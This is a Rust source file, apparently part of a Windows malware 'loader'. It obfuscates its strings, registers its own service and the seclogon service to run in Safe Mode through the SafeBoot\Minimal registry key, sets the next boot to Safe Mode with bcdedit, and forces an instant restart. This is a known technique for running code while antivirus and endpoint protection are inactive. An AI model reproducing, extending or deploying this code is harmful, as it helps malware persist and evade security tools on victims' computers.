use std::env;
use std::process::Output;
use anyhow::{ Context, Result };
use loader_vars::constants::loader_service_name;
use obfstr::obfstr as s;
use shared::utils::functions::call_program;
use std::os::windows::process::CommandExt;
use std::process::Command;

pub fn is_safe_mode() -> bool {
    match env::var(s!("SAFEBOOT_OPTION")) {
        Ok(val) => { val == s!("MINIMAL") || val == s!("NETWORK") }
        Err(_error) => { false }
    }
}

pub fn safemode_fail_safe() {
    rollback_safemode_and_restart()
}

pub fn rollback_safemode_and_restart() {
    if is_safe_mode() {
        match set_next_boot_normal() {
            Ok(_) => {}
            Err(_error) => {}
        }
        match restart_pc_instant() {
            Ok(_) => {}
            Err(_error) => {}
        }
    }
}

pub fn register_self_for_safemode() -> Result<Output> {
    call_program(
        s!("REG"),
        Some(
            &format!(
                "{}{}{}",
                s!(r#"ADD "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\"#),
                loader_service_name(),
                s!(r#"" /f"#)
            )
        )
    )
}

pub fn register_seclogon_for_safemode() -> Result<Output> {
    call_program(
        s!("REG"),
        Some(s!(r#"ADD "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\seclogon" /f"#))
    )
}

pub fn restart_pc_instant() -> Result<Output> {
    call_program(s!("shutdown"), Some(s!(r#"/r /f /t 0"#)))
}

pub fn set_next_boot_safemode() -> Result<Output> {
    call_program(s!("bcdedit"), Some(s!(r#"/set {current} safeboot Minimal"#)))
}

pub fn set_next_boot_normal() -> Result<Output> {
    call_program(s!("bcdedit"), Some(s!("/deletevalue safeboot")))
}
